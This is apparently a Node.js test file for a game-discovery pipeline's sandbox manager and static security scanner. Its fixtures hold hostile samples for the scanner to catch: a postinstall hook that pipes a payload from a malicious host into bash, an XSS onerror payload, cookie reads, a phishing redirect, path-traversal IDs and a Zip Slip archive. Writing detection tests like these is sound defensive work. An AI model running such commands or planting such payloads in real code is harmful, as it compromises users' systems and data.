import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import zlib from 'node:zlib';

import {
  STAGING_CONFIG,
  sanitizeCandidateId,
  resolveStagingPath,
  cleanStagingDirectory,
  computeSourceTreeFingerprint,
  resolveExactCommitSha,
  safeExtractZip,
  acquireCandidateSource,
} from '../scripts/discovery/sandbox-manager.js';

import {
  deepScanCandidate,
  TELEMETRY_DOMAINS,
  PERMITTED_CDNS,
  BUNDLED_LIB_SIGNATURES,
} from '../scripts/discovery/deep-security-scanner.js';

import {
  LIFECYCLE_STATUS,
  TECHNICAL_STATUS,
  SECURITY_STATUS,
  LEGAL_STATUS,
  EDITORIAL_STATUS,
  REJECTION_TYPE,
  createInitialCandidate,
} from '../scripts/discovery/qualification-model.js';

import { runDailyDiscoveryPipeline } from '../scripts/discovery/orchestrator.js';

// Helper to create a minimal valid zip buffer for testing
function createZipBuffer(files = {}) {
  // We can build a minimal zip archive using local headers and central directory
  const localHeaders = [];
  const cdHeaders = [];
  let offset = 0;

  for (const [name, content] of Object.entries(files)) {
    const nameBuf = Buffer.from(name, 'utf-8');
    const dataBuf = Buffer.isBuffer(content) ? content : Buffer.from(String(content), 'utf-8');
    const crc = 0; // for testing
    const compressed = dataBuf; // method 0 (stored)

    // Local file header (30 bytes + name + data)
    const lh = Buffer.alloc(30 + nameBuf.length + dataBuf.length);
    lh.writeUInt32LE(0x04034b50, 0); // signature
    lh.writeUInt16LE(20, 4); // version needed
    lh.writeUInt16LE(0, 6); // flags
    lh.writeUInt16LE(0, 8); // compression method (0 = stored)
    lh.writeUInt16LE(0, 10); // time
    lh.writeUInt16LE(0, 12); // date
    lh.writeUInt32LE(crc, 14); // crc32
    lh.writeUInt32LE(dataBuf.length, 18); // compressed size
    lh.writeUInt32LE(dataBuf.length, 22); // uncompressed size
    lh.writeUInt16LE(nameBuf.length, 26); // name length
    lh.writeUInt16LE(0, 28); // extra length
    nameBuf.copy(lh, 30);
    dataBuf.copy(lh, 30 + nameBuf.length);

    localHeaders.push(lh);

    // Central directory header (46 bytes + name)
    const cdh = Buffer.alloc(46 + nameBuf.length);
    cdh.writeUInt32LE(0x02014b50, 0); // signature
    cdh.writeUInt16LE(20, 4); // version made by
    cdh.writeUInt16LE(20, 6); // version needed
    cdh.writeUInt16LE(0, 8); // flags
    cdh.writeUInt16LE(0, 10); // compression method (0 = stored)
    cdh.writeUInt16LE(0, 12); // time
    cdh.writeUInt16LE(0, 14); // date
    cdh.writeUInt32LE(crc, 16); // crc32
    cdh.writeUInt32LE(dataBuf.length, 20); // compressed size
    cdh.writeUInt32LE(dataBuf.length, 24); // uncompressed size
    cdh.writeUInt16LE(nameBuf.length, 28); // name length
    cdh.writeUInt16LE(0, 30); // extra length
    cdh.writeUInt16LE(0, 32); // comment length
    cdh.writeUInt16LE(0, 34); // disk start
    cdh.writeUInt16LE(0, 36); // internal attr
    cdh.writeUInt32LE(0, 38); // external attr
    cdh.writeUInt32LE(offset, 42); // relative offset of local header
    nameBuf.copy(cdh, 46);

    cdHeaders.push(cdh);
    offset += lh.length;
  }

  const cdTotalSize = cdHeaders.reduce((acc, h) => acc + h.length, 0);
  const cdOffset = offset;

  // End of central directory record (22 bytes)
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // signature
  eocd.writeUInt16LE(0, 4); // disk number
  eocd.writeUInt16LE(0, 6); // cd disk number
  eocd.writeUInt16LE(cdHeaders.length, 8); // entries on disk
  eocd.writeUInt16LE(cdHeaders.length, 10); // total entries
  eocd.writeUInt32LE(cdTotalSize, 12); // cd size
  eocd.writeUInt32LE(cdOffset, 16); // cd offset
  eocd.writeUInt16LE(0, 20); // comment length

  return Buffer.concat([...localHeaders, ...cdHeaders, eocd]);
}

// ============================================================================
// 1. STAGING PATH CONTAINMENT & ID SANITIZATION
// ============================================================================

test('phase4b sandbox: strictly validates candidate ID and prevents directory traversal', () => {
  // Valid IDs
  assert.equal(sanitizeCandidateId('gh-valid-id-123'), 'gh-valid-id-123');
  assert.equal(sanitizeCandidateId('gl-developer-game_v2'), 'gl-developer-game_v2');

  // Traversal & malicious IDs
  assert.equal(sanitizeCandidateId('../escape'), null);
  assert.equal(sanitizeCandidateId('..%2Fescape'), null);
  assert.equal(sanitizeCandidateId('nested/path'), null);
  assert.equal(sanitizeCandidateId('c:\\windows\\system32'), null);
  assert.equal(sanitizeCandidateId('game\0null'), null);
  assert.equal(sanitizeCandidateId(''), null);
});

test('phase4b sandbox: resolveStagingPath enforces strict containment inside staging root', () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-staging-'));

  try {
    const validPath = resolveStagingPath('gh-tetris-clone', tmpRoot);
    assert.equal(path.dirname(validPath), path.resolve(tmpRoot));
    assert.equal(path.basename(validPath), 'gh-tetris-clone');

    assert.throws(
      () => resolveStagingPath('../../etc/passwd', tmpRoot),
      /Invalid or unsafe candidate identifier/
    );
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

// ============================================================================
// 2. ARCHIVE TRAVERSAL & ZIP SLIP DEFENSE
// ============================================================================

test('phase4b sandbox: safeExtractZip rejects Zip Slip path traversal sequences', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-zipslip-'));

  try {
    const maliciousZip = createZipBuffer({
      '../../escaped.js': 'console.log("pwned");',
      'valid.js': 'console.log("ok");',
    });

    assert.throws(
      () => safeExtractZip(maliciousZip, tmpDir),
      /Security violation: Archive entry contains path traversal sequence/
    );

    // Verify escaped file was NEVER written to disk
    assert.equal(fs.existsSync(path.resolve(tmpDir, '../../escaped.js')), false);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('phase4b sandbox: safeExtractZip enforces file count and size resource limits', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-limits-'));

  try {
    // 1. Exceed file count limit
    const tightLimits = {
      MAX_FILES: 2,
      MAX_TOTAL_SIZE_BYTES: 1024 * 1024,
      MAX_FILE_SIZE_BYTES: 1024 * 1024,
      MAX_EXPANSION_RATIO: 100,
    };

    const multiFileZip = createZipBuffer({
      'file1.txt': 'data1',
      'file2.txt': 'data2',
      'file3.txt': 'data3',
    });

    assert.throws(
      () => safeExtractZip(multiFileZip, tmpDir, tightLimits),
      /Resource limit exceeded: Archive contains more than 2 files/
    );

    // 2. Exceed file size limit
    const sizeLimits = {
      MAX_FILES: 10,
      MAX_TOTAL_SIZE_BYTES: 1024 * 1024,
      MAX_FILE_SIZE_BYTES: 10, // 10 bytes max
      MAX_EXPANSION_RATIO: 100,
    };

    const bigFileZip = createZipBuffer({
      'big.txt': 'This string is definitely more than ten bytes long!',
    });

    assert.throws(
      () => safeExtractZip(bigFileZip, tmpDir, sizeLimits),
      /exceeds maximum file limit of 10 bytes/
    );
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// 3. REPOSITORY ACQUISITION & DETERMINISTIC FINGERPRINTING
// ============================================================================

test('phase4b sandbox: acquireCandidateSource creates staging directory, pins commit, and verifies fingerprint', async () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-acq-'));

  try {
    const candidate = {
      candidateId: 'gh-acq-test-game',
      name: 'Acquisition Test Game',
      originalRepoUrl: 'https://github.com/arcade/test-game',
      sourcePlatform: 'github',
      exactCommitHash: 'e3f89a1c2b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f',
    };

    const mockFiles = {
      'index.html': '<!DOCTYPE html><html><head><title>Test Game</title></head><body><canvas id="c"></canvas></body></html>',
      'js/game.js': 'console.log("Game initialized");',
      'LICENSE': 'MIT License\n\nCopyright (c) 2026 Test Team',
      'package.json': JSON.stringify({ name: 'test-game', version: '1.0.0', dependencies: {} }),
    };

    const result = await acquireCandidateSource(candidate, {
      rootDir: tmpRoot,
      mockFiles,
    });

    assert.equal(result.success, true);
    assert.equal(result.candidateId, 'gh-acq-test-game');
    assert.equal(result.exactCommitHash, 'e3f89a1c2b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f');
    assert.ok(result.sourceFingerprint.startsWith('sha256:'));
    assert.equal(result.fileCount, 4);

    // Staging receipt written to disk
    const receiptPath = path.join(result.stagingDir, 'source-receipt.json');
    assert.ok(fs.existsSync(receiptPath));
    const receipt = JSON.parse(fs.readFileSync(receiptPath, 'utf-8'));
    assert.equal(receipt.candidateId, 'gh-acq-test-game');
    assert.equal(receipt.exactCommitHash, 'e3f89a1c2b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f');
    assert.equal(receipt.verified, true);

    // Test deterministic fingerprint verification: second run produces identical hash
    const recomputedHash = computeSourceTreeFingerprint(result.stagingDir);
    assert.equal(recomputedHash, result.sourceFingerprint);

    // Test fingerprint mismatch detection
    const tamperedCandidate = {
      ...candidate,
      sourceFingerprint: 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
    };
    const tamperedResult = await acquireCandidateSource(tamperedCandidate, {
      rootDir: tmpRoot,
      mockFiles,
    });
    assert.equal(tamperedResult.success, false);
    assert.match(tamperedResult.error, /Source integrity mismatch/);
    assert.equal(tamperedResult.targetStatus, 'NEEDS_OWNER_REVIEW');
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

// ============================================================================
// 4. DEEP STATIC SECURITY SCANNER (AST & VULNERABILITY DETECTION)
// ============================================================================

test('phase4b security: AST scanner detects dynamic eval, Function constructor, and string timers', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-eval-ast-'));

  try {
    fs.mkdirSync(path.join(tmpDir, 'js'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpDir, 'js/script.js'),
      `
      const computeScore = eval("10 + 20");
      const generator = new Function("a", "b", "return a + b;");
      setTimeout("console.log('implicit eval')", 1000);
      `,
      'utf-8'
    );
    fs.writeFileSync(path.join(tmpDir, 'LICENSE'), 'MIT License', 'utf-8');

    const report = await deepScanCandidate(tmpDir, { candidateId: 'gh-eval-test' });

    assert.equal(report.verdict, 'FAILED');
    assert.equal(report.isPermittedForAutoApproval, false);
    assert.equal(report.recommendedLifecycleStatus, 'REJECTED');
    assert.ok(report.stats.critical >= 2, 'Must detect at least 2 critical dynamic execution findings');

    const findingNames = report.findings.map(f => f.name);
    assert.ok(findingNames.includes('Dynamic eval() call'));
    assert.ok(findingNames.includes('new Function() constructor'));
    assert.ok(findingNames.includes('Implicit eval in timer'));
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('phase4b security: AST scanner detects unauthorized tracking scripts and telemetry endpoints', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-telemetry-'));

  try {
    fs.mkdirSync(path.join(tmpDir, 'js'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpDir, 'index.html'),
      `
      <!DOCTYPE html>
      <html>
      <head>
        <script src="https://www.google-analytics.com/analytics.js"></script>
        <script src="https://connect.facebook.net/en_US/fbevents.js"></script>
      </head>
      <body></body>
      </html>
      `,
      'utf-8'
    );
    fs.writeFileSync(
      path.join(tmpDir, 'js/analytics.js'),
      `
      fetch("https://api.gameanalytics.com/v2/events", { method: "POST" });
      navigator.sendBeacon("https://telemetry.example.com/log");
      `,
      'utf-8'
    );
    fs.writeFileSync(path.join(tmpDir, 'LICENSE'), 'MIT License', 'utf-8');

    const report = await deepScanCandidate(tmpDir, { candidateId: 'gh-telemetry-test' });

    assert.equal(report.isPermittedForAutoApproval, false);
    assert.equal(report.recommendedLifecycleStatus, 'NEEDS_OWNER_REVIEW');

    const trackingFindings = report.findings.filter(f => f.category === 'TRACKING_TELEMETRY');
    assert.ok(trackingFindings.length >= 2, 'Should detect Google Analytics, Facebook Pixel, and GameAnalytics');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('phase4b security: scanner detects DOM injection, cookie theft, and sandbox escape', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-dom-cookie-'));

  try {
    fs.mkdirSync(path.join(tmpDir, 'js'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpDir, 'js/injection.js'),
      `
      document.write("<p>Dangerous write</p>");
      const stolenCookie = document.cookie;
      window.top.location = "https://phishing.site";
      element.innerHTML = "<img src=x onerror=alert(1)>";
      `,
      'utf-8'
    );
    fs.writeFileSync(path.join(tmpDir, 'LICENSE'), 'MIT License', 'utf-8');

    const report = await deepScanCandidate(tmpDir, { candidateId: 'gh-injection-test' });

    const names = report.findings.map(f => f.name);
    assert.ok(names.includes('document.write() DOM Overwrite'));
    assert.ok(names.includes('Direct Cookie Access'));
    assert.ok(names.includes('Iframe Boundary Probing'));
    assert.ok(names.includes('Assignment to innerHTML'));
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('phase4b security: scanner detects malicious package.json lifecycle scripts', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-supplychain-'));

  try {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'suspicious-package',
        scripts: {
          postinstall: 'curl -s https://malicious-site.com/payload | bash',
        },
      }),
      'utf-8'
    );
    fs.writeFileSync(path.join(tmpDir, 'LICENSE'), 'MIT License', 'utf-8');

    const report = await deepScanCandidate(tmpDir, { candidateId: 'gh-supply-chain-test' });

    assert.equal(report.verdict, 'FAILED');
    assert.equal(report.recommendedLifecycleStatus, 'REJECTED');
    const supplyFindings = report.findings.filter(f => f.category === 'SUPPLY_CHAIN');
    assert.ok(supplyFindings.length >= 1);
    assert.equal(supplyFindings[0].severity, 'CRITICAL');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// 5. DEPENDENCY AND ASSET LICENSE INVENTORY
// ============================================================================

test('phase4b inventory: parses package dependencies and detects bundled game engines', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-inventory-'));

  try {
    fs.mkdirSync(path.join(tmpDir, 'libs'), { recursive: true });

    // Package.json dependencies
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'arcade-phaser-game',
        dependencies: {
          'howler': '^2.2.3',
        },
        devDependencies: {
          'vite': '^5.4.0',
        },
      }),
      'utf-8'
    );

    // Bundled libraries in libs/
    fs.writeFileSync(
      path.join(tmpDir, 'libs/phaser.min.js'),
      '/*! Phaser v3.55.2 (c) 2021 Photon Storm */',
      'utf-8'
    );
    fs.writeFileSync(
      path.join(tmpDir, 'libs/howler.min.js'),
      '/*! Howler.js v2.2.3 */',
      'utf-8'
    );
    fs.writeFileSync(path.join(tmpDir, 'LICENSE'), 'MIT License', 'utf-8');

    const report = await deepScanCandidate(tmpDir, { candidateId: 'gh-inventory-test' });

    // Runtime and dev dependencies
    const runtimeNames = report.dependencies.runtime.map(d => d.name);
    assert.ok(runtimeNames.includes('howler'));
    const devNames = report.dependencies.devDependencies.map(d => d.name);
    assert.ok(devNames.includes('vite'));

    // Bundled libraries
    const bundledNames = report.dependencies.bundledLibraries.map(b => b.name);
    assert.ok(bundledNames.includes('Phaser'));
    assert.ok(bundledNames.includes('Howler.js'));
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('phase4b inventory: detects asset licenses and flags license conflicts or ambiguity', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-licconflict-'));

  try {
    fs.mkdirSync(path.join(tmpDir, 'assets'), { recursive: true });

    // Root is MIT
    fs.writeFileSync(path.join(tmpDir, 'LICENSE'), 'MIT License\n\nCopyright (c) 2026 Developer', 'utf-8');

    // Font license is Apache-2.0
    fs.writeFileSync(path.join(tmpDir, 'LICENSE-FONTS-APACHE.txt'), 'Apache License Version 2.0', 'utf-8');

    // Asset readme contains conflicting non-commercial restriction
    fs.writeFileSync(
      path.join(tmpDir, 'assets/README.md'),
      '# Game Sprites\nAll art assets are strictly Non-Commercial / All Rights Reserved.',
      'utf-8'
    );

    const report = await deepScanCandidate(tmpDir, { candidateId: 'gh-conflict-test' });

    assert.equal(report.licensing.codeLicense, 'MIT');
    assert.ok(report.licensing.assetLicenses.some(a => a.spdx === 'Apache-2.0'));
    assert.ok(report.licensing.conflicts.length > 0, 'Must record asset license conflict');

    const conflictFindings = report.findings.filter(f => f.category === 'LICENSE_CONFLICT');
    assert.ok(conflictFindings.length >= 1);
    assert.equal(conflictFindings[0].severity, 'HIGH');
    assert.equal(report.recommendedLifecycleStatus, 'NEEDS_OWNER_REVIEW');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// 6. PIPELINE INTEGRATION & AUTONOMOUS EXCEPTION ROUTING
// ============================================================================

test('phase4b orchestrator: clean candidate automatically acquired, deep-scanned, and AUTO_APPROVED', async () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-pipe-clean-'));

  try {
    const candidateId = 'gh-pipeline-clean-pilot';
    const mockFiles = {
      'index.html': '<!DOCTYPE html><html><body><canvas id="game"></canvas></body></html>',
      'game.js': 'console.log("Clean zero-build game");',
      'LICENSE': 'MIT License\n\nCopyright 2026 Author',
    };

    const incomingCandidate = {
      candidateId,
      name: 'Clean Pilot Game',
      originalRepoUrl: 'https://github.com/arcade-team/clean-pilot',
      author: 'arcade-team',
      discoveryDate: '2026-11-12',
      lastUpdateDate: '2026-11-01',
      sourcePlatform: 'github',
      programmingLanguage: 'JavaScript',
      gameEngine: 'Vanilla Canvas2D',
      licenseName: 'MIT',
      assetLicensingStatus: 'All procedural assets and MIT audio',
      html5Compatibility: true,
      mobileCompatibility: true,
      category: 'arcade',
      popularityIndicators: {
        githubStars: 400,
        forks: 60,
        communityPlays: 1500,
      },
      exactCommitHash: '11223344556677889900aabbccddeeff11223344',
    };

    const res = await runDailyDiscoveryPipeline({
      dryRun: false,
      offline: true,
      rootDir: tmpRoot,
      autonomousAcquisition: true,
      candidates: [incomingCandidate],
      mockFiles: {
        [candidateId]: mockFiles,
      },
    });

    assert.equal(res.evaluatedCount, 1);

    // Read generated candidate dossier
    const dossierPath = path.join(tmpRoot, 'discovery/candidates', `${candidateId}.json`);
    assert.ok(fs.existsSync(dossierPath));
    const dossier = JSON.parse(fs.readFileSync(dossierPath, 'utf-8'));

    // Verified autonomous approval
    assert.equal(dossier.lifecycleStatus, LIFECYCLE_STATUS.AUTO_APPROVED);
    assert.equal(dossier.reviewerDecision, 'APPROVE');
    assert.equal(dossier.publicationEligibility, 'ELIGIBLE');
    assert.ok(dossier.sourceFingerprint.startsWith('sha256:'));
    assert.equal(dossier.qualification.technical.status, TECHNICAL_STATUS.PASSED);
    assert.equal(dossier.qualification.security.status, SECURITY_STATUS.PASSED);

    // Inspection report exists in staging directory
    const inspectionReportPath = path.join(tmpRoot, 'discovery/staging', candidateId, 'inspection-report.json');
    assert.ok(fs.existsSync(inspectionReportPath));
    const inspectionReport = JSON.parse(fs.readFileSync(inspectionReportPath, 'utf-8'));
    assert.equal(inspectionReport.verdict, 'PASSED');
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test('phase4b orchestrator: candidate with security findings routes to NEEDS_OWNER_REVIEW and preserves dossier', async () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-pipe-warning-'));

  try {
    const candidateId = 'gh-pipeline-warning-game';
    const mockFiles = {
      'index.html': '<!DOCTYPE html><html><body><script src="https://cdn.jsdelivr.net/npm/phaser@3.55.2"></script></body></html>',
      'game.js': 'fetch("https://google-analytics.com/collect");',
      'LICENSE': 'MIT License',
    };

    const incomingCandidate = {
      candidateId,
      name: 'Warning Game',
      originalRepoUrl: 'https://github.com/arcade-team/warning-game',
      author: 'arcade-team',
      discoveryDate: '2026-11-12',
      lastUpdateDate: '2026-11-01',
      sourcePlatform: 'github',
      programmingLanguage: 'JavaScript',
      gameEngine: 'HTML5 Canvas2D',
      licenseName: 'MIT',
      assetLicensingStatus: 'All procedural assets and MIT audio',
      html5Compatibility: true,
      mobileCompatibility: true,
      category: 'arcade',
      popularityIndicators: {
        githubStars: 300,
        forks: 45,
        communityPlays: 800,
      },
      exactCommitHash: '22334455667788990011aabbccddeeff22334455',
    };

    await runDailyDiscoveryPipeline({
      dryRun: false,
      offline: true,
      rootDir: tmpRoot,
      autonomousAcquisition: true,
      candidates: [incomingCandidate],
      mockFiles: {
        [candidateId]: mockFiles,
      },
    });

    const dossierPath = path.join(tmpRoot, 'discovery/candidates', `${candidateId}.json`);
    assert.ok(fs.existsSync(dossierPath));
    const dossier = JSON.parse(fs.readFileSync(dossierPath, 'utf-8'));

    // Routed to owner review due to telemetry finding
    assert.equal(dossier.lifecycleStatus, LIFECYCLE_STATUS.NEEDS_OWNER_REVIEW);
    assert.equal(dossier.reviewerDecision, 'PENDING_REVIEW');
    assert.ok(dossier.securityFindings.some(f => f.category === 'TRACKING_TELEMETRY'));

    // Permanent preservation: dossier is NOT deleted
    assert.ok(fs.existsSync(dossierPath));
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test('phase4b orchestrator: candidate with critical security failure routes to REJECTED and preserves records', async () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ga-test-pipe-critical-'));

  try {
    const candidateId = 'gh-pipeline-malicious-game';
    const mockFiles = {
      'index.html': '<html><body></body></html>',
      'game.js': 'eval("maliciousPayload()");',
      'LICENSE': 'MIT License',
    };

    const incomingCandidate = {
      candidateId,
      name: 'Malicious Eval Game',
      originalRepoUrl: 'https://github.com/arcade-team/malicious-game',
      author: 'arcade-team',
      discoveryDate: '2026-11-12',
      lastUpdateDate: '2026-11-01',
      sourcePlatform: 'github',
      programmingLanguage: 'JavaScript',
      gameEngine: 'HTML5 Canvas2D',
      licenseName: 'MIT',
      assetLicensingStatus: 'All procedural assets and MIT audio',
      html5Compatibility: true,
      mobileCompatibility: true,
      category: 'arcade',
      popularityIndicators: {
        githubStars: 250,
        forks: 35,
        communityPlays: 600,
      },
      exactCommitHash: '33445566778899001122aabbccddeeff33445566',
    };

    await runDailyDiscoveryPipeline({
      dryRun: false,
      offline: true,
      rootDir: tmpRoot,
      autonomousAcquisition: true,
      candidates: [incomingCandidate],
      mockFiles: {
        [candidateId]: mockFiles,
      },
    });

    const dossierPath = path.join(tmpRoot, 'discovery/candidates', `${candidateId}.json`);
    const rejectedPath = path.join(tmpRoot, 'discovery/rejected', `${candidateId}.json`);

    assert.ok(fs.existsSync(dossierPath), 'Authoritative dossier must be preserved');
    assert.ok(fs.existsSync(rejectedPath), 'Must be recorded in rejected records');

    const dossier = JSON.parse(fs.readFileSync(dossierPath, 'utf-8'));
    assert.equal(dossier.lifecycleStatus, LIFECYCLE_STATUS.REJECTED);
    assert.equal(dossier.rejectionType, REJECTION_TYPE.AUTOMATED_SCREENING);
    assert.equal(dossier.reviewerDecision, 'REJECT');
    assert.equal(dossier.publicationEligibility, 'INELIGIBLE');
    assert.match(dossier.rejectionReason, /Deep security scan detected critical security violations/);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});
